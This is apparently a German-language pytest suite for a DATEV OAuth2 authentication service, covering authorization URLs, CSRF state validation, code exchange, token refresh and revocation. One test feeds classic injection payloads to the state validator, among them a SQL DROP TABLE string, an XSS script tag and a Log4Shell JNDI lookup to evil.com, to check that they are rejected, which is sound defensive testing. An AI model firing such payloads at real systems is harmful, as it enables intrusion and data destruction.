# -*- coding: utf-8 -*-
"""
Tests fuer DATEVAuthService.

Testet:
- OAuth2 Authorization URL Generation
- State-Validierung (CSRF-Schutz)
- Code Exchange
- Token Refresh
- Token Revocation
- Token-Expiry-Pruefung
"""

import sys
import pytest
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, Tuple
from unittest.mock import AsyncMock, MagicMock, Mock, patch
from uuid import UUID, uuid4

# Stelle sicher, dass encrypt_value/decrypt_value existieren (fehlen ggf. im Modul)
import app.core.encryption as _enc_mod
if not hasattr(_enc_mod, "encrypt_value"):
    _enc_mod.encrypt_value = lambda v: f"enc:{v}"
if not hasattr(_enc_mod, "decrypt_value"):
    _enc_mod.decrypt_value = lambda v: v.replace("enc:", "") if v and v.startswith("enc:") else v

from app.services.datev.connect.datev_auth_service import (
    DATEVAuthService,
    DATEV_AUTH_URLS,
    DATEV_SCOPES,
    TOKEN_REFRESH_BUFFER_MINUTES,
    get_datev_auth_service,
)


@pytest.fixture
def auth_service() -> DATEVAuthService:
    """Erstellt eine frische DATEVAuthService-Instanz."""
    return DATEVAuthService()


@pytest.fixture
def mock_db() -> AsyncMock:
    """Erstellt eine Mock-Datenbank-Session."""
    db = AsyncMock()
    return db


class TestGetAuthorizationUrl:
    """Tests fuer get_authorization_url()."""

    def test_generiert_gueltige_url(self, auth_service: DATEVAuthService):
        """Generiert eine gueltige Authorization-URL mit allen Parametern."""
        url, state = auth_service.get_authorization_url(
            client_id="test-client-id",
            redirect_uri="https://app.example.com/callback",
        )

        assert "https://login.datev.de/openidsandbox/authorize" in url
        assert "client_id=test-client-id" in url
        assert "redirect_uri=https://app.example.com/callback" in url
        assert "response_type=code" in url
        assert "state=" in url
        assert len(state) > 20

    def test_state_ist_einmalig(self, auth_service: DATEVAuthService):
        """Jeder Aufruf generiert einen einzigartigen State-Token."""
        _, state1 = auth_service.get_authorization_url(
            client_id="test-id",
            redirect_uri="https://example.com/cb",
        )
        _, state2 = auth_service.get_authorization_url(
            client_id="test-id",
            redirect_uri="https://example.com/cb",
        )

        assert state1 != state2

    def test_sandbox_environment(self, auth_service: DATEVAuthService):
        """Sandbox-Umgebung nutzt die richtige URL."""
        url, _ = auth_service.get_authorization_url(
            client_id="test-id",
            redirect_uri="https://example.com/cb",
            environment="sandbox",
        )

        assert "sandbox.datev.de" in url

    def test_enthaelt_alle_scopes(self, auth_service: DATEVAuthService):
        """URL enthaelt alle definierten DATEV-Scopes."""
        url, _ = auth_service.get_authorization_url(
            client_id="test-id",
            redirect_uri="https://example.com/cb",
        )

        for scope in DATEV_SCOPES:
            assert scope in url

    def test_mit_connection_id(self, auth_service: DATEVAuthService):
        """Connection-ID wird im State-Cache gespeichert."""
        conn_id = uuid4()
        _, state = auth_service.get_authorization_url(
            client_id="test-id",
            redirect_uri="https://example.com/cb",
            connection_id=conn_id,
        )

        state_data = auth_service.validate_state(state)
        assert state_data is not None
        assert state_data["connection_id"] == str(conn_id)


class TestValidateState:
    """Tests fuer validate_state() - CSRF-Schutz."""

    def test_gueltiger_state_wird_akzeptiert(self, auth_service: DATEVAuthService):
        """Gueltiger State-Token wird validiert und zurueckgegeben."""
        _, state = auth_service.get_authorization_url(
            client_id="test-id",
            redirect_uri="https://example.com/cb",
        )

        result = auth_service.validate_state(state)

        assert result is not None
        assert result["client_id"] == "test-id"

    def test_unbekannter_state_wird_abgelehnt(self, auth_service: DATEVAuthService):
        """Unbekannter State-Token wird abgelehnt."""
        result = auth_service.validate_state("unbekannter-state-token")

        assert result is None

    def test_state_nur_einmal_verwendbar(self, auth_service: DATEVAuthService):
        """State-Token kann nur einmal verwendet werden (Replay-Schutz)."""
        _, state = auth_service.get_authorization_url(
            client_id="test-id",
            redirect_uri="https://example.com/cb",
        )

        first_use = auth_service.validate_state(state)
        second_use = auth_service.validate_state(state)

        assert first_use is not None
        assert second_use is None

    def test_abgelaufener_state_wird_abgelehnt(self, auth_service: DATEVAuthService):
        """State-Token der aelter als 15 Minuten ist wird abgelehnt."""
        _, state = auth_service.get_authorization_url(
            client_id="test-id",
            redirect_uri="https://example.com/cb",
        )

        # Manipuliere den Erstellungszeitpunkt (muss timezone-aware sein wie utc_now)
        with auth_service._state_lock:
            auth_service._state_cache[state]["created_at"] = (
                datetime.now(timezone.utc) - timedelta(minutes=20)
            )

        result = auth_service.validate_state(state)
        assert result is None

    def test_injection_im_state_parameter(self, auth_service: DATEVAuthService):
        """SQL/Script-Injection im State-Parameter wird abgelehnt."""
        injection_states = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
        ]

        for malicious_state in injection_states:
            result = auth_service.validate_state(malicious_state)
            assert result is None, f"Injection nicht abgefangen: {malicious_state}"


class TestExchangeCode:
    """Tests fuer exchange_code()."""

    @pytest.mark.asyncio
    async def test_erfolgreicher_code_exchange(
        self, auth_service: DATEVAuthService, mock_db: AsyncMock
    ):
        """Erfolgreicher Code-Exchange speichert Tokens."""
        conn_id = uuid4()

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "access_token": "fake-access-token-for-test",
            "refresh_token": "fake-refresh-token-for-test",
            "expires_in": 3600,
        }

        with patch("httpx.AsyncClient") as mock_client_class:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(return_value=mock_response)
            mock_client_class.return_value = mock_client

            result = await auth_service.exchange_code(
                db=mock_db,
                connection_id=conn_id,
                code="auth-code-for-test",
                client_id="test-client-id",
                client_secret="test-client-secret",
                redirect_uri="https://example.com/cb",
            )

        assert result is True
        mock_db.execute.assert_called()
        mock_db.commit.assert_called()

    @pytest.mark.asyncio
    async def test_fehlgeschlagener_code_exchange(
        self, auth_service: DATEVAuthService, mock_db: AsyncMock
    ):
        """Fehlgeschlagener Code-Exchange gibt False zurueck."""
        conn_id = uuid4()

        mock_response = Mock()
        mock_response.status_code = 400
        mock_response.text = "Bad Request"

        with patch("httpx.AsyncClient") as mock_client_class:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(return_value=mock_response)
            mock_client_class.return_value = mock_client

            result = await auth_service.exchange_code(
                db=mock_db,
                connection_id=conn_id,
                code="invalid-code",
                client_id="test-client-id",
                client_secret="test-client-secret",
                redirect_uri="https://example.com/cb",
            )

        assert result is False

    @pytest.mark.asyncio
    async def test_netzwerkfehler_bei_code_exchange(
        self, auth_service: DATEVAuthService, mock_db: AsyncMock
    ):
        """Netzwerkfehler bei Code-Exchange gibt False zurueck."""
        conn_id = uuid4()

        with patch("httpx.AsyncClient") as mock_client_class:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(side_effect=ConnectionError("Netzwerkfehler"))
            mock_client_class.return_value = mock_client

            result = await auth_service.exchange_code(
                db=mock_db,
                connection_id=conn_id,
                code="code",
                client_id="id",
                client_secret="secret",
                redirect_uri="https://example.com/cb",
            )

        assert result is False


class TestTokenNeedsRefresh:
    """Tests fuer token_needs_refresh()."""

    @pytest.mark.asyncio
    async def test_none_token_braucht_refresh(self, auth_service: DATEVAuthService):
        """Token ohne Ablaufzeit muss refreshed werden."""
        result = await auth_service.token_needs_refresh(None)
        assert result is True

    @pytest.mark.asyncio
    async def test_abgelaufener_token_braucht_refresh(
        self, auth_service: DATEVAuthService
    ):
        """Abgelaufener Token muss refreshed werden."""
        expired = datetime.now(timezone.utc) - timedelta(hours=1)
        result = await auth_service.token_needs_refresh(expired)
        assert result is True

    @pytest.mark.asyncio
    async def test_gueltiger_token_braucht_keinen_refresh(
        self, auth_service: DATEVAuthService
    ):
        """Token mit ausreichender Restlaufzeit braucht keinen Refresh."""
        now = datetime.now(timezone.utc)
        valid_until = now + timedelta(hours=1)

        with patch("app.services.datev.connect.datev_auth_service.utc_now") as mock_utc:
            mock_utc.return_value = now
            result = await auth_service.token_needs_refresh(valid_until)

        assert result is False

    @pytest.mark.asyncio
    async def test_token_innerhalb_puffer_braucht_refresh(
        self, auth_service: DATEVAuthService
    ):
        """Token der in weniger als 5 Minuten ablaeuft muss refreshed werden."""
        now = datetime.now(timezone.utc)
        almost_expired = now + timedelta(minutes=3)

        with patch("app.services.datev.connect.datev_auth_service.utc_now") as mock_utc:
            mock_utc.return_value = now
            result = await auth_service.token_needs_refresh(almost_expired)

        assert result is True


class TestRevokeTokens:
    """Tests fuer revoke_tokens()."""

    @pytest.mark.asyncio
    async def test_erfolgreiche_revocation(
        self, auth_service: DATEVAuthService, mock_db: AsyncMock
    ):
        """Erfolgreiche Token-Revocation raeumt DB auf."""
        conn_id = uuid4()

        mock_response = Mock()
        mock_response.status_code = 200

        with patch("httpx.AsyncClient") as mock_client_class, \
             patch("app.services.datev.connect.datev_auth_service.decrypt_value") as mock_decrypt:
            mock_decrypt.return_value = "decrypted-token-for-test"
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(return_value=mock_response)
            mock_client_class.return_value = mock_client

            result = await auth_service.revoke_tokens(
                db=mock_db,
                connection_id=conn_id,
                access_token_encrypted="encrypted-token",
                client_id="test-client-id",
                client_secret="test-client-secret",
            )

        assert result is True
        mock_db.commit.assert_called()

    @pytest.mark.asyncio
    async def test_revocation_mit_decrypt_fehler(
        self, auth_service: DATEVAuthService, mock_db: AsyncMock
    ):
        """Token-Revocation schlaegt fehl wenn Entschluesselung scheitert."""
        conn_id = uuid4()

        with patch("app.services.datev.connect.datev_auth_service.decrypt_value") as mock_decrypt:
            mock_decrypt.return_value = None

            result = await auth_service.revoke_tokens(
                db=mock_db,
                connection_id=conn_id,
                access_token_encrypted="bad-encrypted-token",
                client_id="test-client-id",
                client_secret="test-client-secret",
            )

        assert result is False


class TestGetDATEVAuthServiceSingleton:
    """Tests fuer die Singleton-Factory."""

    def test_singleton_gibt_gleiche_instanz(self):
        """get_datev_auth_service() gibt immer dieselbe Instanz zurueck."""
        import app.services.datev.connect.datev_auth_service as module
        module._auth_service = None  # Reset

        s1 = get_datev_auth_service()
        s2 = get_datev_auth_service()

        assert s1 is s2

        module._auth_service = None  # Cleanup
